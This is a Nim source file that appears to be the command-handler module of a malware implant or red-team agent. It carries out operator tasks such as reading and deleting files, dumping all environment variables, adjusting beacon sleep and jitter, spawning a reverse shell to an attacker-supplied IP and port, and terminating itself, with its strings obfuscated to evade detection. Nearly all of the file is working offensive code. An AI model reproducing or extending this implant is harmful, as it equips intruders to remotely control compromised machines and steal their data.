import json
import os
import times
import threadpool

import sleep
import revShell
import utils

const DATE_FORMAT: string = obf("yyyy-MM-dd'T'HH:mm:ss")

proc cat*(task: JsonNode): string = 
    var args: seq[JsonNode] = task[obf("args")].getElems
    var filePath: string = args[0].getStr

    try:
        if fileExists(filePath): 
            return readFile(filePath)
        else:
            return obf("File does not exists")

    except Exception as e:
        return obf("Failed to read the file: ") & e.msg

proc fileInfo*(task: JsonNode): string =
    var args: seq[JsonNode] = task[obf("args")].getElems
    var filePath: string = args[0].getStr
    
    try:
        var info: FileInfo = getFileInfo(filePath)
        
        var kind: string
        case info.kind:
            of PathComponent.pcFile:
                kind = obf("file")
            of PathComponent.pcLinkToFile:
                kind = obf("link to file")
            of PathComponent.pcDir:
                kind = obf("directory")
            of PathComponent.pcLinkToDir:
                kind = obf("link to directory")

        var lastAccessString: string = format(info.lastAccessTime, DATE_FORMAT, utc())
        var lastWriteString: string = format(info.lastWriteTime, DATE_FORMAT, utc())
        var creationString: string = format(info.creationTime, DATE_FORMAT, utc())

        return obf("Kind: ") & $kind & obf("\nSize: ") & $info.size & obf("\nLast Access: ") & lastAccessString & obf("\nLast Write: ") & lastWriteString & obf("\nCreated: ") & creationString & obf("\nPermissions: ") & $info.permissions

    except Exception as e:
        return obf("Failed to get file info: ") & e.msg

proc mv*(task: JsonNode): string =
    var args: seq[JsonNode] = task[obf("args")].getElems
    var source: string = args[0].getStr
    var destination: string = args[1].getStr

    try:
        if dirExists(source):
            if dirExists(destination):
                moveDir(source, destination/splitPath(source).tail)
            else:
                moveDir(source, destination)

        elif dirExists(destination):
            moveFile(source, destination/splitPath(source).tail)
        else:
            moveFile(source, destination)
    
    except Exception as e:
        return obf("") & e.msg

    result = obf("Moved ") & source & obf(" to ") & destination

proc rm*(task: JsonNode): string = 
    var args: seq[JsonNode] = task[obf("args")].getElems
    var filePath: string = args[0].getStr

    try:
        if fileExists(filePath): 
            removeFile(filePath)
            return obf("Deleted the file")
        else:
            return obf("File does not exists")

    except Exception as e:
        return obf("Failed to read the file: ") & e.msg

proc getEnv*(task: JsonNode): string =
    var envVars: string
    
    try:
        for key, value in envPairs():
            envVars = envVars & $key & "=" & $value & "\n"

        return envVars

    except Exception as e:
        return obf("Failed to get environment variables: ") & e.msg

proc getSleep*(task: JsonNode): string = 
    return obf("Sleep time: ") & $sleepTime & obf("\nJitter time: ") & $jitterTime

proc setSleep*(task: JsonNode): string =
    var args: seq[JsonNode] = task[obf("args")].getElems
    var setSleepTime: int = args[0].getInt
    var setJitterTime: int = args[1].getInt

    if setSleepTime < 0 or setJitterTime < 0:
        return obf("Sleep time and jitter time cannot be negative")

    if setJitterTime > setSleepTime:
        return obf("Jitter time cannot be greater than sleep time")

    sleepTime = setSleepTime
    jitterTime = setJitterTime

    return obf("Set sleep time to ") & $sleepTime  & obf("s with ") & $jitterTime & obf("s of jitter")

proc reverseShell*(task: JsonNode): string = 
    var args: seq[JsonNode] = task[obf("args")].getElems
    var ip: string = args[0].getStr
    var port: int = args[1].getInt

    try:
        spawn startReverseShell(ip, port)
    except Exception as e:
        return obf("Failed to start the reverse shell: ") & $e.msg
    
    return "Reverse shell started"

proc pid*(task: JsonNode): string =
    try:
        var pid: int = getCurrentProcessId()
        return $pid
    except Exception as e:
        return obf("Failed to get the PID: ") & e.msg

proc sleepThenQuit(): void =
    sleep(1000)
    quit(0)

proc kill*(task: JsonNode): string = 
    spawn sleepThenQuit()

    return obf("Killing the agent...")
